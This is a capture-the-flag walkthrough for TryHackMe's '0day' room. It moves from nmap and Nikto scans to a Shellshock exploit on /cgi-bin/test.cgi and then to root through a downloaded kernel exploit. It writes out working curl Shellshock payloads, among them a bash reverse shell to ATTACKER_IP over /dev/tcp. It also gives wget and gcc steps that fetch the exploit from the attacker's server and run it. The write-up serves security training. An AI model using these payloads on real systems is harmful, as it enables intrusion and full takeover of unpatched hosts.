# [0day](https://tryhackme.com/room/0day)

## Exploit Ubuntu, like a Turtle in a Hurricane

# Flags

## Root my secure Website, take a step into the history of hacking.

### user.txt

_Hint's in the description._

1. First, we perform a service version scan to identify running services on the target machine.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Scan the web server for known vulnerabilities using Nikto.

```bash
nikto --url <TARGET_IP> | tee nikto-results
```

**Results:**

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <TARGET_IP>
+ Target Hostname:    <TARGET_IP>
+ Target Port:        80
+ Start Time:         2026-01-27 11:17:45 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/index.html: Admin login page/section found.
+ 8909 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2026-01-27 11:27:14 (GMT-5) (569 seconds)
```

The scan reveals that `/cgi-bin/test.cgi` is vulnerable to the **Shellshock vulnerability (CVE-2014-6271)**. This is a bash execution vulnerability that allows remote code execution.

3. Verify the Shellshock vulnerability by attempting to execute the `whoami` command.

```bash
curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://<TARGET_IP>/cgi-bin/test.cgi
```

[SCREEN01]

4. On the attacker machine, set up a netcat listener to catch the incoming reverse shell.

```bash
nc -lvnp 4444
```

5. Use the Shellshock vulnerability to establish a reverse shell connection back to our listener.

```bash
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1" http://<TARGET_IP>/cgi-bin/test.cgi
```

6. Once we have shell access, navigate to the user's home directory and read the user flag.

```bash
cat /home/ryan/user.txt
```

[SCREEN02]

---

### root.txt

_This is a very old operating system you've got here, isn't it?.._

1. Check the distribution version to identify potential kernel exploits.

```bash
cat /etc/*-release
```

**Results:**

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

2. Verify if the target has GCC installed, which we'll need to compile our exploit.

```bash
which gcc
gcc --version
```

**Results:**

```
/usr/bin/gcc

gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

3. Search for a privilege escalation exploit for Ubuntu 14.04 kernel 3.13 using searchsploit.

```bash
searchsploit Ubuntu 14.04 3.13 Local Privilege Escalation
searchsploit -m 37292
dos2unix 37292
```

4. On the attacker machine, start a simple HTTP server to transfer the exploit to the target.

```bash
python3 -m http.server
```

5. Before transferring files, upgrade to a more stable TTY shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

6. On the target machine, download the exploit, compile it, and execute it to gain root privileges.

```bash
wget <ATTACKER_IP>:8000/37292.c
cd /tmp
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
gcc 37292.c -o exploit && ./exploit
```

7. Confirm we have root access and retrieve the final flag.

```bash
whoami
cat /root/root.txt
```

[SCREEN03]
